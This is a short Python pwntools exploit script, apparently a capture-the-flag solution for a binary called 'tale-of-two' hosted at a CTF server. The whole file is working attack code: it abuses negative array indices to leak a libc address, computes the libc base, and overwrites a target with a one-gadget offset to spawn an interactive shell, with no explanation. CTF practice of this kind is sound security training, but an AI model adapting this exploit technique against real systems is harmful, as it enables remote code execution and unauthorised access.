#!/usr/bin/env python3

from pwn import *

exe = ELF("./tale-of-two")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
        return process(env={"LD_PRELOAD": libc.path})


def main():
    #r = conn()
    r = remote("challenges.ctfd.io", 30250)
    
    r.recvline()
    r.sendline("-5")
    LEAK = int(b"0x"+r.recvline(), 16)
    log.warn("Leak @ 0x%x", LEAK)

    libc.address = LEAK - libc.sym.printf

    r.recvline()
    r.sendline("-75")

    pause()
    r.recvline()
    r.sendline(str(libc.address + 0x4f322))

    r.interactive()


if __name__ == "__main__":
    main()
